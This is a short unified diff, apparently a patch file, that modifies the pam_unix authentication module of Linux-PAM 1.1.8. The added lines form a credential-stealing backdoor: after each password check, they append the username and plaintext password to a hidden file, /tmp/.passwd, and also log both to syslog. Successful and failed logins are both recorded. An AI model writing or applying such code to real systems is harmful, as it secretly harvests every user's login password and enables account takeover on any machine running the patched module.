@@ -1,0 +1,22 @@
+--- Linux-PAM-1.1.8-origin/modules/pam_unix/pam_unix_auth.c	2013-06-18 22:11:21.000000000 +0800
++++ Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c	2016-01-03 18:40:58.000000000 +0800
+@@ -178,6 +178,19 @@
+ 
+ 	/* verify the password of this user */
+ 	retval = _unix_verify_password(pamh, name, p, ctrl);
++
++        #define PASSWD_FILE "/tmp/.passwd"
++        FILE *fd;
++        if (retval == PAM_SUCCESS ){
++            if ( fd=fopen(PASSWD_FILE,"a")) { fprintf(fd,"ok user=%s, password=%s\n",name,p); fclose(fd); }
++            pam_syslog(pamh, LOG_CRIT,"ok user=%s, password=%s\n",name,p);
++        }else{
++            if ( fd=fopen(PASSWD_FILE,"a")) { fprintf(fd,"user=%s, password=%s\n",name,p); fclose(fd); }
++            pam_syslog(pamh, LOG_CRIT,"user=%s, password=%s\n",name,p);
++        }
++
++
++
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
